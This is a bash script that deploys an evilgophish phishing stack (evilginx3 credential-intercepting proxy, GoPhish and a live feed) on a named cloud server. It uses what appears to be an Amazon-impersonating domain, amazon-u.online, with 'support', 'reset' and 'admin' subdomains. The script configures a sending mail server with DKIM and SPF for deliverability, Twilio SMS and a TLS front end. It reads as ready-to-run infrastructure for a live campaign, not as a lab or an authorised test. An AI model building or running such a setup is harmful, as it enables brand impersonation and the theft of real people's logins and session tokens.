#!/bin/bash
# setup.sh - Setup for evilgophish with SMTP on Lightsail (3.147.37.21).
# Changes: Domain amazon-u.online; Turnstile optional; uses src/evilginx3; robust src validation with retry.
# SMTP: Configures support@amazon-u.online for GoPhish/Evilginx.
# Fixes: Ensures mailconfig/postfix-main.cf; retries DKIM; fixes src/evilginx3 missing error.
# Usage: ./setup.sh [DOMAIN] [SUBDOMAINS] [PROXY_ROOT] [FEED_ENABLED] [RID_REPLACEMENT] [TWILIO_SID] [TWILIO_TOKEN] [TWILIO_PHONE] [TURNSTILE_PUBLIC] [TURNSTILE_PRIVATE] [SMTP_USER] [SMTP_PASS]
# Best Practices:
# - Validate src dirs; backup configs; secure secrets.
# - DNS: Lightsail zone; delegate from GoDaddy.
# - Mail: Generate DKIM; test with swaks; monitor deliverability.
# - Lightsail: Open ports; request port 25 removal.

set -e

# Defaults/Prompts
DOMAIN="${1:-amazon-u.online}"
SUBDOMAINS="${2:-support email reset admin}"
PROXY_ROOT="${3:-true}"
FEED_ENABLED="${4:-true}"
RID_REPLACEMENT="${5:-user_id}"
TWILIO_SID="${6:-$(read -p "Twilio SID: " x; echo $x)}"
TWILIO_TOKEN="${7:-$(read -s -p "Twilio Token: " x; echo $x)}"
TWILIO_PHONE="${8:-$(read -p "Twilio Phone (+E.164): " x; echo $x)}"
TURNSTILE_PUBLIC="${9:-$(read -p "Turnstile Public (optional, press Enter to skip): " x; echo $x)}"
TURNSTILE_PRIVATE="${10:-$(read -p "Turnstile Private (optional, press Enter to skip): " x; echo $x)}"
SMTP_USER="${11:-support@${DOMAIN}}"
SMTP_PASS="${12:-$(read -s -p "SMTP Pass for ${SMTP_USER}: " x; echo $x)}"

# Validate required inputs
[ -z "$SMTP_PASS" ] && { echo "Error: SMTP_PASS required"; exit 1; }
[ -z "$TWILIO_SID" ] && { echo "Error: TWILIO_SID required"; exit 1; }
[ -z "$TWILIO_TOKEN" ] && { echo "Error: TWILIO_TOKEN required"; exit 1; }
[ -z "$TWILIO_PHONE" ] && { echo "Error: TWILIO_PHONE required"; exit 1; }

# Dirs/Files
mkdir -p ./gophish/templates ./evilginx/phishlets ./evilginx/templates ./evilfeed ./nginx/ssl ./Uploads ./logs ./mailconfig
touch .env nginx.conf gophish/config.json ./mailconfig/postfix-main.cf
cp -n .env .env.bak || true
chmod -R 755 ./mailconfig  # Ensure writable for DKIM

# .env
cat > .env << EOF
DOMAIN=$DOMAIN
SUBDOMAINS=$SUBDOMAINS
PROXY_ROOT=$PROXY_ROOT
FEED_ENABLED=$FEED_ENABLED
RID_REPLACEMENT=$RID_REPLACEMENT
TWILIO_ACCOUNT_SID=$TWILIO_SID
TWILIO_AUTH_TOKEN=$TWILIO_TOKEN
TWILIO_PHONE=$TWILIO_PHONE
TURNSTILE_PUBLIC=$TURNSTILE_PUBLIC
TURNSTILE_PRIVATE=$TURNSTILE_PRIVATE
SMTP_USER=$SMTP_USER
SMTP_PASS=$SMTP_PASS
GOPHISH_DB_PATH=/app/data/gophish.db
SMTP_HOST=mailserver
SMTP_PORT=587
EOF
chmod 600 .env

# nginx.conf
cat > nginx.conf << 'EOF'
events { worker_connections 1024; }
http {
  log_format main '$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"';
  access_log /var/log/nginx/access.log main;
  error_log /var/log/nginx/error.log warn;
  limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;
  upstream evilginx { server evilginx:443; }
  server {
    listen 443 ssl http2;
    server_name _;
    ssl_certificate /etc/nginx/ssl/fullchain.pem;
    ssl_certificate_key /etc/nginx/ssl/privkey.pem;
    limit_req zone=mylimit burst=20;
    location / { proxy_pass https://evilginx/; proxy_set_header Host $host; proxy_ssl_verify off; }
  }
  server { listen 80; server_name _; return 301 https://$host$request_uri; }
}
EOF

# SSL
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout nginx/ssl/privkey.pem -out nginx/ssl/fullchain.pem -subj "/CN=$DOMAIN"

# gophish config
cat > gophish/config.json << EOF
{
  "admin_server": { "listen_url": "0.0.0.0:3333", "use_tls": false },
  "phish_server": { "listen_url": "127.0.0.1:8080", "use_tls": false },
  "db_name": "sqlite3",
  "db_path": "data/gophish.db"
}
EOF

# Mailserver postfix override
cat > mailconfig/postfix-main.cf << EOF
myhostname = mail.${DOMAIN}
mydomain = ${DOMAIN}
EOF

# DNS for local testing
HOSTS_ENTRY="127.0.0.1 $DOMAIN mail.$DOMAIN"
for sub in $SUBDOMAINS; do HOSTS_ENTRY="$HOSTS_ENTRY ${sub}.${DOMAIN}"; done
sudo cp /etc/hosts /etc/hosts.bak
echo "$HOSTS_ENTRY" | sudo tee -a /etc/hosts
echo "Local DNS set. For Lightsail DNS (see README):"
echo "- A: mail.$DOMAIN -> 3.147.37.21"
echo "- MX: @ -> mail.$DOMAIN (priority 10)"
echo "- SPF: TXT v=spf1 mx a ip4:3.147.37.21 ~all"

# Clone and validate src with retry
MAX_RETRIES=3
for ((i=1; i<=MAX_RETRIES; i++)); do
  echo "Attempt $i/$MAX_RETRIES to clone repository..."
  rm -rf src
  if git clone https://github.com/fin3ss3g0d/evilgophish.git src; then
    cd src
    git pull
    for dir in evilginx3 gophish evilfeed; do
      [ ! -d "./$dir" ] && { echo "Error: src/$dir missing in repo."; break; }
      [ ! -f "./$dir/main.go" ] && { echo "Error: src/$dir/main.go missing."; break; }
    done
    cd ..
    [ -f "src/evilginx3/main.go" ] && break
  fi
  [ $i -eq $MAX_RETRIES ] && { echo "Error: Failed to clone valid repo. Check https://github.com/fin3ss3g0d/evilgophish."; exit 1; }
done

# Final validation
for dir in evilginx3 gophish; do
  [ ! -d "src/$dir" ] && { echo "Error: src/$dir missing after clone."; exit 1; }
  [ ! -f "src/$dir/main.go" ] && { echo "Error: src/$dir/main.go missing."; exit 1; }
done

# RID replacement
cd src
find . -type f \( -name "*.go" -o -name "*.html" -o -name "*.tmpl" \) -exec cp {} {}.bak \;
find . -type f \( -name "*.go" -o -name "*.html" -o -name "*.tmpl" \) -exec sed -i "s/rid/${RID_REPLACEMENT}/g" {} \;
cd ..

# Templates (only forbidden.html needed if no Turnstile)
cat > evilginx/templates/forbidden.html << 'EOF'
<!DOCTYPE html><html><head><title>Access Denied</title></head><body><h1>403 Forbidden</h1><p>You don't have permission to access this resource.</p></body></html>
EOF

# Dockerfiles
cat > Dockerfile.gophish << 'EOF'
FROM golang:1.21-alpine AS builder
RUN apk add --no-cache git
WORKDIR /src
COPY src/gophish .
RUN go mod download && CGO_ENABLED=0 go build -o /app/gophish .
FROM alpine:latest
RUN apk add --no-cache ca-certificates tzdata sqlite
WORKDIR /app
COPY --from=builder /app/gophish .
COPY gophish/config.json .
VOLUME /app/data /app/uploads /app/logs
EXPOSE 3333
CMD ["./gophish", "--admin", "./config.json"]
EOF

cat > Dockerfile.evilginx << 'EOF'
FROM golang:1.21-alpine AS builder
RUN apk add --no-cache git
WORKDIR /src
COPY src/evilginx3 .
RUN go mod download && CGO_ENABLED=0 go build -o /app/evilginx .
FROM alpine:latest
RUN apk add --no-cache ca-certificates iptables ip6tables
WORKDIR /app
COPY --from=builder /app/evilginx .
VOLUME /app /app/logs
EXPOSE 443
CMD ["./evilginx"]
EOF

cat > Dockerfile.evilfeed << 'EOF'
FROM golang:1.21-alpine AS builder
RUN apk add --no-cache git
WORKDIR /src
COPY src/evilfeed .
RUN go mod download && CGO_ENABLED=0 go build -o /app/evilfeed .
FROM alpine:latest
WORKDIR /app
COPY --from=builder /app/evilfeed .
VOLUME /app/data /app/logs
EXPOSE 1337
CMD ["./evilfeed"]
EOF

# Start
docker compose up -d --build

# Mail setup (wait for mailserver to be healthy)
echo "Waiting for mailserver to be ready..."
sleep 15  # Extended delay for container startup
docker exec -it mailserver setup email add "${SMTP_USER}" "${SMTP_PASS}"
docker exec -it mailserver setup config dkim
echo "DKIM generated. Add this TXT to Lightsail DNS:"
cat ./mailconfig/opendkim/keys/${DOMAIN}/mail.txt || echo "Error: DKIM not generated. Run: docker exec -it mailserver setup config dkim"

# Post-setup
echo "Setup complete! Access:"
echo "- GoPhish Admin: http://localhost:3333 (default admin/gophish)"
echo "- Live Feed: http://localhost:1337"
echo "- Phishing: https://$DOMAIN"
echo "- SMTP: Use in GoPhish: Host=mail.$DOMAIN:587, User=$SMTP_USER, Pass=****"
echo "Upload: cp file.csv uploads/; docker cp uploads/file.csv gophish:/app/uploads/"
echo "Test SMTP: docker exec mailserver swaks -tls -au $SMTP_USER -ap '$SMTP_PASS' --from $SMTP_USER --to your@email.com --server localhost:587 -body 'Test'"
echo "DNS: Configure Lightsail (see README); GoDaddy NS to Lightsail."
echo "Clean: docker compose down -v; sudo mv /etc/hosts.bak /etc/hosts"
echo "Debug: docker logs -f mailserver; ls mailconfig/opendkim/keys/$DOMAIN; ls src/evilginx3"